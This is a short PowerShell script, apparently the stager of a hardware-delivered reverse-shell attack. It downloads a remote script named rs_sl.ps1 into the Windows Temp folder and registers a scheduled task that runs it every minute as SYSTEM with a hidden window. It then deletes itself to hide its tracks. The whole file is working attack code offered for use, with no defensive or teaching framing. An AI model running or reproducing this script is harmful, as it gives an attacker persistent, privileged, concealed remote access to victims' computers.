$client = New-Object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/attiny85_rshell/master/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')

$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
if($taskExists) {
   Write-Output "EXISTS";
} else {
   Write-Output "Doesnt Exist: Creating task.";
   C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru System
}

Remove-Item $script:MyInvocation.MyCommand.Path -Force